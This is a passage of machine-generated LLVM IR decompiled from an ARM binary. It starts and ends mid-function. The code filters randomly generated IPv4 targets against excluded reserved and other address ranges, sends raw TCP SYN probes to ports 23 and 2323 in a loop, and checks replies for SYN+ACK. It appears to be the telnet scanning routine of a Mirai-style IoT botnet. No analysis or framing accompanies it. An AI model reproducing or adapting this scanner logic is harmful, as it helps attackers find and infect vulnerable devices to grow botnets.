  %v7_e050 = icmp eq i32 %v1_e02c, 3
  store i1 %v7_e050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e050, label %dec_label_pc_e028, label %dec_label_pc_e058

dec_label_pc_e058:                                ; preds = %dec_label_pc_e050
  %v1_e058 = add nsw i32 %v1_e02c, -15
  store i32 %v1_e058, i32* %r3.global-to-local, align 4
  %v2_e05c = icmp ugt i32 %v1_e02c, 55
  store i1 %v2_e05c, i1* %cpsr_c.global-to-local, align 1
  %v7_e05c = icmp eq i32 %v1_e02c, 56
  store i1 %v7_e05c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e05c, label %dec_label_pc_e028, label %bb351

bb351:                                            ; preds = %dec_label_pc_e058
  %v3_e060 = icmp ne i32 %v1_e058, 0
  store i1 %v3_e060, i1* %cpsr_c.global-to-local, align 1
  %v8_e060 = icmp eq i32 %v1_e058, 1
  store i1 %v8_e060, i1* %cpsr_z.global-to-local, align 1
  %v2_e064 = xor i1 %v3_e060, true
  %v3_e064 = or i1 %v8_e060, %v2_e064
  br i1 %v3_e064, label %dec_label_pc_e028, label %dec_label_pc_e068

dec_label_pc_e068:                                ; preds = %bb351
  %v2_e068 = icmp ugt i32 %v1_e02c, 9
  store i1 %v2_e068, i1* %cpsr_c.global-to-local, align 1
  %v7_e068 = icmp eq i32 %v1_e02c, 10
  store i1 %v7_e068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e068, label %dec_label_pc_e028, label %dec_label_pc_e070

dec_label_pc_e070:                                ; preds = %dec_label_pc_e068
  %v2_e070 = icmp ugt i32 %v1_e02c, 191
  store i1 %v2_e070, i1* %cpsr_c.global-to-local, align 1
  %v7_e070 = icmp eq i32 %v1_e02c, 192
  store i1 %v7_e070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e070, label %bb352, label %dec_label_pc_e07c

bb352:                                            ; preds = %dec_label_pc_e070
  %v3_e074 = icmp ugt i32 %v1_e040, 167
  store i1 %v3_e074, i1* %cpsr_c.global-to-local, align 1
  %v8_e074 = icmp eq i32 %v1_e040, 168
  store i1 %v8_e074, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e074, label %dec_label_pc_e028, label %dec_label_pc_e07c

dec_label_pc_e07c:                                ; preds = %dec_label_pc_e070, %bb352
  %v7_e07c = icmp eq i32 %v1_e02c, 172
  %.427 = zext i1 %v7_e07c to i32
  store i32 %.427, i32* %r3.global-to-local, align 4
  %v2_e088 = icmp ugt i32 %v1_e040, 14
  store i1 %v2_e088, i1* %cpsr_c.global-to-local, align 1
  %v7_e088 = icmp eq i32 %v1_e040, 15
  store i1 %v7_e088, i1* %cpsr_z.global-to-local, align 1
  %v2_e08c = xor i1 %v2_e088, true
  %v3_e08c = or i1 %v7_e088, %v2_e08c
  br i1 %v3_e08c, label %.thread8, label %bb355

.thread8:                                         ; preds = %dec_label_pc_e07c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e0a0

bb355:                                            ; preds = %dec_label_pc_e07c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e090 = icmp eq i1 %v7_e07c, false
  store i1 %v2_e090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e090, label %dec_label_pc_e0a0, label %dec_label_pc_e098

dec_label_pc_e098:                                ; preds = %bb355
  %v2_e098 = icmp ugt i32 %v1_e040, 30
  store i1 %v2_e098, i1* %cpsr_c.global-to-local, align 1
  %v7_e098 = icmp eq i32 %v1_e040, 31
  store i1 %v7_e098, i1* %cpsr_z.global-to-local, align 1
  %v2_e09c = xor i1 %v2_e098, true
  %v3_e09c = or i1 %v7_e098, %v2_e09c
  br i1 %v3_e09c, label %dec_label_pc_e028, label %dec_label_pc_e0a0

dec_label_pc_e0a0:                                ; preds = %.thread8, %dec_label_pc_e098, %bb355
  %v7_e0a0 = icmp eq i32 %v1_e02c, 100
  %.428 = zext i1 %v7_e0a0 to i32
  store i32 %.428, i32* %r3.global-to-local, align 4
  %v2_e0ac = icmp ugt i32 %v1_e040, 62
  store i1 %v2_e0ac, i1* %cpsr_c.global-to-local, align 1
  %v7_e0ac = icmp eq i32 %v1_e040, 63
  store i1 %v7_e0ac, i1* %cpsr_z.global-to-local, align 1
  %v2_e0b0 = xor i1 %v2_e0ac, true
  %v3_e0b0 = or i1 %v7_e0ac, %v2_e0b0
  br i1 %v3_e0b0, label %.thread13, label %bb358

.thread13:                                        ; preds = %dec_label_pc_e0a0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e0c4

bb358:                                            ; preds = %dec_label_pc_e0a0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e0b4 = icmp eq i1 %v7_e0a0, false
  store i1 %v2_e0b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e0b4, label %dec_label_pc_e0c4, label %dec_label_pc_e0bc

dec_label_pc_e0bc:                                ; preds = %bb358
  %v2_e0bc = icmp ugt i32 %v1_e040, 125
  store i1 %v2_e0bc, i1* %cpsr_c.global-to-local, align 1
  %v7_e0bc = icmp eq i32 %v1_e040, 126
  store i1 %v7_e0bc, i1* %cpsr_z.global-to-local, align 1
  %v2_e0c0 = xor i1 %v2_e0bc, true
  %v3_e0c0 = or i1 %v7_e0bc, %v2_e0c0
  br i1 %v3_e0c0, label %dec_label_pc_e028, label %dec_label_pc_e0c4

dec_label_pc_e0c4:                                ; preds = %.thread13, %dec_label_pc_e0bc, %bb358
  %v2_e0c4 = icmp ugt i32 %v1_e02c, 168
  store i1 %v2_e0c4, i1* %cpsr_c.global-to-local, align 1
  %v7_e0c4 = icmp eq i32 %v1_e02c, 169
  store i1 %v7_e0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e0c4, label %bb359, label %dec_label_pc_e0d0

bb359:                                            ; preds = %dec_label_pc_e0c4
  %v3_e0c8 = icmp eq i32 %v1_e040, 255
  store i1 %v3_e0c8, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_e0c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_e0c8, label %dec_label_pc_e028, label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_e0c4, %bb359
  %v7_e0d0 = icmp eq i32 %v1_e02c, 198
  %.429 = zext i1 %v7_e0d0 to i32
  store i32 %.429, i32* %r3.global-to-local, align 4
  %v2_e0dc = icmp ugt i32 %v1_e040, 16
  store i1 %v2_e0dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e0dc = icmp eq i32 %v1_e040, 17
  store i1 %v7_e0dc, i1* %cpsr_z.global-to-local, align 1
  %v2_e0e0 = xor i1 %v2_e0dc, true
  %v3_e0e0 = or i1 %v7_e0dc, %v2_e0e0
  br i1 %v3_e0e0, label %.thread19, label %bb362

.thread19:                                        ; preds = %dec_label_pc_e0d0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_e0f4

bb362:                                            ; preds = %dec_label_pc_e0d0
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e0e4 = icmp eq i1 %v7_e0d0, false
  store i1 %v2_e0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e0e4, label %dec_label_pc_e0f4, label %dec_label_pc_e0ec

dec_label_pc_e0ec:                                ; preds = %bb362
  %v2_e0ec = icmp ugt i32 %v1_e040, 18
  store i1 %v2_e0ec, i1* %cpsr_c.global-to-local, align 1
  %v7_e0ec = icmp eq i32 %v1_e040, 19
  store i1 %v7_e0ec, i1* %cpsr_z.global-to-local, align 1
  %v2_e0f0 = xor i1 %v2_e0ec, true
  %v3_e0f0 = or i1 %v7_e0ec, %v2_e0f0
  br i1 %v3_e0f0, label %dec_label_pc_e028, label %dec_label_pc_e0f4

dec_label_pc_e0f4:                                ; preds = %.thread19, %dec_label_pc_e0ec, %bb362
  %v2_e0f4 = icmp ugt i32 %v1_e02c, 222
  store i1 %v2_e0f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e0f4 = icmp eq i32 %v1_e02c, 223
  store i1 %v7_e0f4, i1* %cpsr_z.global-to-local, align 1
  %v2_e0f8 = xor i1 %v7_e0f4, true
  %v3_e0f8 = and i1 %v2_e0f4, %v2_e0f8
  br i1 %v3_e0f8, label %dec_label_pc_e028, label %dec_label_pc_e0fc

dec_label_pc_e0fc:                                ; preds = %dec_label_pc_e0f4
  %v1_e0fc = add nsw i32 %v1_e02c, -6
  store i32 %v1_e0fc, i32* %r3.global-to-local, align 4
  %v2_e100 = icmp ugt i32 %v1_e02c, 10
  store i1 %v2_e100, i1* %cpsr_c.global-to-local, align 1
  %v7_e100 = icmp eq i32 %v1_e02c, 11
  store i1 %v7_e100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e100, label %dec_label_pc_e028, label %bb363

bb363:                                            ; preds = %dec_label_pc_e0fc
  %v3_e104 = icmp ne i32 %v1_e0fc, 0
  store i1 %v3_e104, i1* %cpsr_c.global-to-local, align 1
  %v8_e104 = icmp eq i32 %v1_e0fc, 1
  store i1 %v8_e104, i1* %cpsr_z.global-to-local, align 1
  %v2_e108 = xor i1 %v3_e104, true
  %v3_e108 = or i1 %v8_e104, %v2_e108
  br i1 %v3_e108, label %dec_label_pc_e028, label %dec_label_pc_e10c

dec_label_pc_e10c:                                ; preds = %bb363
  %v2_e10c = icmp ugt i32 %v1_e02c, 21
  store i1 %v2_e10c, i1* %cpsr_c.global-to-local, align 1
  %v7_e10c = icmp eq i32 %v1_e02c, 22
  store i1 %v7_e10c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e10c, label %dec_label_pc_e028, label %bb364

bb364:                                            ; preds = %dec_label_pc_e10c
  %v3_e110 = icmp ugt i32 %v1_e02c, 20
  store i1 %v3_e110, i1* %cpsr_c.global-to-local, align 1
  %v8_e110 = icmp eq i32 %v1_e02c, 21
  store i1 %v8_e110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e110, label %dec_label_pc_e028, label %dec_label_pc_e118

dec_label_pc_e118:                                ; preds = %bb364
  %v2_e118 = icmp ugt i32 %v1_e02c, 27
  store i1 %v2_e118, i1* %cpsr_c.global-to-local, align 1
  %v7_e118 = icmp eq i32 %v1_e02c, 28
  store i1 %v7_e118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e118, label %dec_label_pc_e028, label %bb365

bb365:                                            ; preds = %dec_label_pc_e118
  %v3_e11c = icmp ugt i32 %v1_e02c, 25
  store i1 %v3_e11c, i1* %cpsr_c.global-to-local, align 1
  %v8_e11c = icmp eq i32 %v1_e02c, 26
  store i1 %v8_e11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e11c, label %dec_label_pc_e028, label %dec_label_pc_e124

dec_label_pc_e124:                                ; preds = %bb365
  %v2_e124 = icmp ugt i32 %v1_e02c, 29
  store i1 %v2_e124, i1* %cpsr_c.global-to-local, align 1
  %v7_e124 = icmp eq i32 %v1_e02c, 30
  store i1 %v7_e124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e124, label %dec_label_pc_e028, label %bb366

bb366:                                            ; preds = %dec_label_pc_e124
  %v3_e128 = icmp ugt i32 %v1_e02c, 28
  store i1 %v3_e128, i1* %cpsr_c.global-to-local, align 1
  %v8_e128 = icmp eq i32 %v1_e02c, 29
  store i1 %v8_e128, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e128, label %dec_label_pc_e028, label %dec_label_pc_e130

dec_label_pc_e130:                                ; preds = %bb366
  %v2_e130 = icmp ugt i32 %v1_e02c, 54
  store i1 %v2_e130, i1* %cpsr_c.global-to-local, align 1
  %v7_e130 = icmp eq i32 %v1_e02c, 55
  store i1 %v7_e130, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e130, label %dec_label_pc_e028, label %bb367

bb367:                                            ; preds = %dec_label_pc_e130
  %v3_e134 = icmp ugt i32 %v1_e02c, 32
  store i1 %v3_e134, i1* %cpsr_c.global-to-local, align 1
  %v8_e134 = icmp eq i32 %v1_e02c, 33
  store i1 %v8_e134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e134, label %dec_label_pc_e028, label %dec_label_pc_e13c

dec_label_pc_e13c:                                ; preds = %bb367
  %v2_e13c = icmp ugt i32 %v1_e02c, 214
  store i1 %v2_e13c, i1* %cpsr_c.global-to-local, align 1
  %v7_e13c = icmp eq i32 %v1_e02c, 215
  store i1 %v7_e13c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e13c, label %.thread30, label %bb368

bb368:                                            ; preds = %dec_label_pc_e13c
  %v3_e140 = icmp ugt i32 %v1_e02c, 213
  store i1 %v3_e140, i1* %cpsr_c.global-to-local, align 1
  %v8_e140 = icmp eq i32 %v1_e02c, 214
  store i1 %v8_e140, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e140, label %bb369, label %dec_label_pc_e150

.thread30:                                        ; preds = %dec_label_pc_e13c
  br label %dec_label_pc_e028

bb369:                                            ; preds = %bb368
  br label %dec_label_pc_e028

dec_label_pc_e150:                                ; preds = %bb368
  %v5_e15c = call i32 @llvm.bswap.i32(i32 %v0_e028)
  store i32 %v5_e15c, i32* %r3.global-to-local, align 4
  %tmp370 = and i32 %v0_e028, 65280
  %tmp371 = call i32 @llvm.bswap.i32(i32 %tmp370)
  %v3_e164 = udiv i32 %v5_e15c, 16777216
  %v1_e168 = and i32 %v5_e15c, ptrtoint (i32* @global_var_ff00.28 to i32)
  %v4_e16c = udiv i32 %tmp371, 256
  %v4_e170 = mul i32 %v1_e168, 256
  store i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32* @r0, align 4
  %tmp372 = and i32 %v0_e028, 65536
  %v3_e178 = icmp ne i32 %tmp372, 0
  store i1 %v3_e178, i1* %cpsr_c.global-to-local, align 1
  %v4_e178 = mul i32 %v5_e15c, 16777216
  %v5_e16c = or i32 %v4_e178, %v3_e164
  %v5_e170 = or i32 %v5_e16c, %v4_e16c
  %v5_e178 = or i32 %v5_e170, %v4_e170
  store i32 %v5_e178, i32* %r2.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_20f5e.484 to i16*), align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i32 %v5_e178, i32* @global_var_20f64.485, align 4
  %v3_e188 = call i32 @checksum_generic(i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32 20)
  store i32 %v3_e188, i32* %r0.global-to-local, align 4
  %v3_e18c = load i16, i16* %stack_var_-52, align 2
  %v4_e18c = sext i16 %v3_e18c to i32
  store i32 %v4_e18c, i32* %r1.global-to-local, align 4
  %tmp529 = sdiv i16 %v3_e18c, 10
  %v5_e19c = zext i16 %tmp529 to i32
  %v3_e1a0 = mul nuw nsw i32 %v5_e19c, 8
  store i32 %v3_e1a0, i32* %r2.global-to-local, align 4
  %v2_e1a8 = mul nuw nsw i32 %v5_e19c, 10
  store i32 %v2_e1a8, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32* %ip.global-to-local, align 4
  %v3_e1b0 = icmp uge i32 %v4_e18c, %v2_e1a8
  store i1 %v3_e1b0, i1* %cpsr_c.global-to-local, align 1
  %v9_e1b0 = icmp eq i32 %v4_e18c, %v2_e1a8
  store i1 %v9_e1b0, i1* %cpsr_z.global-to-local, align 1
  %v1_e1b4 = trunc i32 %v3_e188 to i16
  store i16 %v1_e1b4, i16* bitcast (i32* @global_var_20f5e.484 to i16*), align 4
  br i1 %v9_e1b0, label %bb373, label %.thread37.thread

.thread37.thread:                                 ; preds = %dec_label_pc_e150
  store i32 5888, i32* %r1.global-to-local, align 4
  store i16 5888, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20f68.137 to i32), i32 2) to i16*), align 2
  store i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32* %r0.global-to-local, align 4
  br label %.thread39

bb373:                                            ; preds = %dec_label_pc_e150
  store i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32* %r0.global-to-local, align 4
  store i32 4873, i32* %r3.global-to-local, align 4
  store i16 4873, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20f68.137 to i32), i32 2) to i16*), align 2
  br label %.thread39

.thread39:                                        ; preds = %.thread37.thread, %bb373
  %v4_e1d8 = load i32, i32* @global_var_20f64.485, align 4
  store i32 %v4_e1d8, i32* @global_var_20f6c.487, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  store i16 0, i16* bitcast (i32* @global_var_20f78.488 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_20f68.137 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_e1f8 = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32 ptrtoint (i32* @global_var_20f68.137 to i32), i32 5120, i32 20)
  %v6_e1f8 = trunc i32 %v5_e1f8 to i16
  store i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32* %r1.global-to-local, align 4
  %v2_e204 = load i32, i32* @global_var_23a64.132, align 4
  store i16 %v6_e1f8, i16* bitcast (i32* @global_var_20f78.488 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_e230 = load i16, i16* @global_var_20f6a.142, align 2
  %v4_e230 = zext i16 %v3_e230 to i32
  store i32 %v4_e230, i32* @lr, align 4
  store i32 %v2_dff8, i32* %ip.global-to-local, align 4
  store i32 %v2_e204, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_e24c = call i32 @__libc_sendto(i32 %v2_e204, i32 ptrtoint (i8** @global_var_20f54.134 to i32), i32 40, i32 16384, i32 %v2_dff8, i32 16)
  store i32 %v7_e24c, i32* %r0.global-to-local, align 4
  %v3_e250 = load i16, i16* %stack_var_-52, align 2
  %v4_e250 = sext i16 %v3_e250 to i32
  %v1_e254 = add nsw i32 %v4_e250, 1
  store i32 %v1_e254, i32* %r3.global-to-local, align 4
  %v3_e258 = icmp ugt i32 %v1_e254, 383
  store i1 %v3_e258, i1* %cpsr_c.global-to-local, align 1
  %v8_e258 = icmp eq i32 %v1_e254, 384
  store i1 %v8_e258, i1* %cpsr_z.global-to-local, align 1
  %v5_e25c = trunc i32 %v1_e254 to i16
  store i16 %v5_e25c, i16* %stack_var_-52, align 2
  %v5_e260 = icmp slt i32 %v1_e254, 384
  br i1 %v5_e260, label %dec_label_pc_dffc, label %dec_label_pc_e264

dec_label_pc_e264:                                ; preds = %.thread39
  %v0_e264 = load i32, i32* @r4, align 4
  store i32 %v0_e264, i32* @fp, align 4
  br label %dec_label_pc_e268

dec_label_pc_e268:                                ; preds = %dec_label_pc_dfe0, %dec_label_pc_e264
  %v0_e268 = call i32 @__GI___errno_location()
  store i32 %v0_e268, i32* @sb, align 4
  store i32 %stack_var_-1880.0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v1_e278 = add i32 %stack_var_-1880.0, 20
  store i32 %v1_e278, i32* @r4, align 4
  %v1_e2cc = add i32 %stack_var_-1880.0, 16
  %v2_e2cc = inttoptr i32 %v1_e2cc to i32*
  %v1_e2e0 = add i32 %stack_var_-1880.0, 9
  %v2_e2e0 = inttoptr i32 %v1_e2e0 to i8*
  %v4_e30c = sext i16 %stack_var_-1876.0 to i32
  %v1_e374 = add i32 %stack_var_-1880.0, 12
  %v2_e374 = inttoptr i32 %v1_e374 to i32*
  br label %dec_label_pc_e27c

dec_label_pc_e27c:                                ; preds = %dec_label_pc_e33c, %dec_label_pc_e334, %dec_label_pc_e32c, %dec_label_pc_e308, %dec_label_pc_e2f8, %dec_label_pc_e2dc, %dec_label_pc_e2c4, %dec_label_pc_e324, %dec_label_pc_e318, %dec_label_pc_e2bc, %dec_label_pc_e3f4, %dec_label_pc_e268
  %v1_e280 = phi i32 [ %v0_e268, %dec_label_pc_e268 ], [ %v1_e280.pre.pre, %dec_label_pc_e3f4 ], [ %v0_e2b0, %dec_label_pc_e2bc ], [ %v0_e2b0, %dec_label_pc_e318 ], [ %v0_e2b0, %dec_label_pc_e324 ], [ %v0_e2b0, %dec_label_pc_e2c4 ], [ %v0_e2b0, %dec_label_pc_e2dc ], [ %v0_e2b0, %dec_label_pc_e2f8 ], [ %v0_e2b0, %dec_label_pc_e308 ], [ %v0_e2b0, %dec_label_pc_e32c ], [ %v0_e2b0, %dec_label_pc_e334 ], [ %v0_e2b0, %dec_label_pc_e33c ]
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_e280 = inttoptr i32 %v1_e280 to i32*
  store i32 0, i32* %v2_e280, align 4
  %v2_e28c = load i32, i32* @global_var_23a64.132, align 4
  store i32 %v2_e28c, i32* %r0.global-to-local, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e29c = load i32, i32* %ip.global-to-local, align 4
  %v6_e2a4 = call i32 @__libc_recvfrom(i32 %v2_e28c, i32 %stack_var_-1880.0, i32 1514, i32 16384, i32 %v0_e29c, i32 %v0_e29c)
  store i32 %v6_e2a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e2a8 = icmp eq i32 %v6_e2a4, 0
  store i1 %v2_e2a8, i1* %cpsr_z.global-to-local, align 1
  %tmp374 = icmp slt i32 %v6_e2a4, 1
  br i1 %tmp374, label %dec_label_pc_e418, label %dec_label_pc_e2b0

dec_label_pc_e2b0:                                ; preds = %dec_label_pc_e27c
  %v0_e2b0 = load i32, i32* @sb, align 4
  %v1_e2b0 = inttoptr i32 %v0_e2b0 to i32*
  %v2_e2b0 = load i32, i32* %v1_e2b0, align 4
  store i32 %v2_e2b0, i32* %r3.global-to-local, align 4
  %v2_e2b4 = icmp ugt i32 %v2_e2b0, 10
  store i1 %v2_e2b4, i1* %cpsr_c.global-to-local, align 1
  %v7_e2b4 = icmp eq i32 %v2_e2b0, 11
  store i1 %v7_e2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e2b4, label %dec_label_pc_e418, label %dec_label_pc_e2bc

dec_label_pc_e2bc:                                ; preds = %dec_label_pc_e2b0
  %v2_e2bc = icmp ugt i32 %v6_e2a4, 38
  store i1 %v2_e2bc, i1* %cpsr_c.global-to-local, align 1
  %v7_e2bc = icmp eq i32 %v6_e2a4, 39
  store i1 %v7_e2bc, i1* %cpsr_z.global-to-local, align 1
  %v2_e2c0 = xor i1 %v2_e2bc, true
  %v3_e2c0 = or i1 %v7_e2bc, %v2_e2c0
  br i1 %v3_e2c0, label %dec_label_pc_e27c, label %dec_label_pc_e2c4

dec_label_pc_e2c4:                                ; preds = %dec_label_pc_e2bc
  store i32 %stack_var_-1880.0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23a4c.55 to i32), i32* %ip.global-to-local, align 4
  %v3_e2cc = load i32, i32* %v2_e2cc, align 4
  store i32 %v3_e2cc, i32* %r2.global-to-local, align 4
  %v2_e2d0 = load i32, i32* @global_var_23a4c.55, align 4
  store i32 %v2_e2d0, i32* %r3.global-to-local, align 4
  %v3_e2d4 = icmp uge i32 %v3_e2cc, %v2_e2d0
  store i1 %v3_e2d4, i1* %cpsr_c.global-to-local, align 1
  %v9_e2d4 = icmp eq i32 %v3_e2cc, %v2_e2d0
  store i1 %v9_e2d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e2d4, label %dec_label_pc_e2dc, label %dec_label_pc_e27c

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e2c4
  store i32 %stack_var_-1880.0, i32* @lr, align 4
  %v3_e2e0 = load i8, i8* %v2_e2e0, align 1
  %v4_e2e0 = zext i8 %v3_e2e0 to i32
  store i32 %v4_e2e0, i32* %r3.global-to-local, align 4
  %v2_e2e4 = icmp ugt i8 %v3_e2e0, 5
  store i1 %v2_e2e4, i1* %cpsr_c.global-to-local, align 1
  %v7_e2e4 = icmp eq i8 %v3_e2e0, 6
  store i1 %v7_e2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e2e4, label %dec_label_pc_e2ec, label %dec_label_pc_e27c

dec_label_pc_e2ec:                                ; preds = %dec_label_pc_e2dc
  %v0_e2ec = load i32, i32* @r4, align 4
  %v1_e2ec = inttoptr i32 %v0_e2ec to i16*
  %v2_e2ec = load i16, i16* %v1_e2ec, align 2
  %v3_e2ec = zext i16 %v2_e2ec to i32
  store i32 %v3_e2ec, i32* %ip.global-to-local, align 4
  %v2_e2f0 = icmp ugt i16 %v2_e2ec, 5887
  store i1 %v2_e2f0, i1* %cpsr_c.global-to-local, align 1
  %v7_e2f0 = icmp eq i16 %v2_e2ec, 5888
  store i1 %v7_e2f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e2f0, label %dec_label_pc_e308, label %dec_label_pc_e2f8

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e2ec
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_e300 = icmp ugt i16 %v2_e2ec, 4872
  store i1 %v3_e300, i1* %cpsr_c.global-to-local, align 1
  %v9_e300 = icmp eq i16 %v2_e2ec, 4873
  store i1 %v9_e300, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e300, label %dec_label_pc_e308, label %dec_label_pc_e27c

dec_label_pc_e308:                                ; preds = %dec_label_pc_e2f8, %dec_label_pc_e2ec
  %v1_e308 = add i32 %v0_e2ec, 2
  %v2_e308 = inttoptr i32 %v1_e308 to i16*
  %v3_e308 = load i16, i16* %v2_e308, align 2
  %v4_e308 = zext i16 %v3_e308 to i32
  store i32 %v4_e308, i32* %r3.global-to-local, align 4
  store i32 %v4_e30c, i32* %r0.global-to-local, align 4
  %v3_e310 = icmp uge i32 %v4_e308, %v4_e30c
  store i1 %v3_e310, i1* %cpsr_c.global-to-local, align 1
  %v9_e310 = icmp eq i32 %v4_e308, %v4_e30c
  store i1 %v9_e310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e310, label %dec_label_pc_e318, label %dec_label_pc_e27c

dec_label_pc_e318:                                ; preds = %dec_label_pc_e308
  %v1_e318 = add i32 %v0_e2ec, 13
  %v2_e318 = inttoptr i32 %v1_e318 to i8*
  %v3_e318 = load i8, i8* %v2_e318, align 1
  %v4_e318 = zext i8 %v3_e318 to i32
  store i32 %v4_e318, i32* %r3.global-to-local, align 4
  %v1_e31c = and i32 %v4_e318, 2
  %v2_e31c = icmp eq i32 %v1_e31c, 0
  store i1 %v2_e31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e31c, label %dec_label_pc_e27c, label %dec_label_pc_e324

dec_label_pc_e324:                                ; preds = %dec_label_pc_e318
  %v1_e324 = and i32 %v4_e318, 16
  %v2_e324 = icmp eq i32 %v1_e324, 0
  store i1 %v2_e324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e324, label %dec_label_pc_e27c, label %dec_label_pc_e32c

dec_label_pc_e32c:                                ; preds = %dec_label_pc_e324
  %v1_e32c = and i32 %v4_e318, 4
  %v2_e32c = icmp eq i32 %v1_e32c, 0
  store i1 %v2_e32c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e32c, label %dec_label_pc_e334, label %dec_label_pc_e27c

dec_label_pc_e334:                                ; preds = %dec_label_pc_e32c
  %tmp530 = urem i8 %v3_e318, 2
  %v2_e334 = icmp eq i8 %tmp530, 0
  store i1 %v2_e334, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e334, label %dec_label_pc_e33c, label %dec_label_pc_e27c

dec_label_pc_e33c:                                ; preds = %dec_label_pc_e334
  %v1_e33c = add i32 %v0_e2ec, 8
  %v2_e33c = inttoptr i32 %v1_e33c to i32*
  %v3_e33c = load i32, i32* %v2_e33c, align 4
  %v3_e344 = udiv i32 %v3_e33c, 16777216
  %v1_e348 = and i32 %v3_e33c, ptrtoint (i32* @global_var_ff00.28 to i32)
  %v1_e340 = udiv i32 %v3_e33c, 256
  %v4_e34c = and i32 %v1_e340, 65280
  %v4_e350 = mul i32 %v1_e348, 256
  %v4_e354 = mul i32 %v3_e33c, 16777216
  %v5_e34c = or i32 %v4_e354, %v3_e344
  %v5_e350 = or i32 %v5_e34c, %v4_e34c
  %v5_e354 = or i32 %v5_e350, %v4_e350
  %v1_e358 = add i32 %v5_e354, -1
  store i32 %v1_e358, i32* %r2.global-to-local, align 4
  %v1_e35c = and i32 %v1_e358, 16711680
  store i32 %v1_e35c, i32* %r0.global-to-local, align 4
  %v3_e360 = udiv i32 %v1_e358, 16777216
  %v4_e368 = udiv i32 %v1_e35c, 256
  %v5_e368 = or i32 %v4_e368, %v3_e360
  %v1_e364 = mul i32 %v1_e358, 256
  %v4_e36c = and i32 %v1_e364, 16711680
  %v5_e36c = or i32 %v5_e368, %v4_e36c
  store i32 %v5_e36c, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-1880.0, i32* %r1.global-to-local, align 4
  %v3_e374 = load i32, i32* %v2_e374, align 4
  store i32 %v3_e374, i32* @lr, align 4
  %v5_e378 = call i32 @llvm.bswap.i32(i32 %v1_e358)
  store i32 %v5_e378, i32* %r3.global-to-local, align 4
  %v3_e37c = icmp uge i32 %v5_e378, %v3_e374
  store i1 %v3_e37c, i1* %cpsr_c.global-to-local, align 1
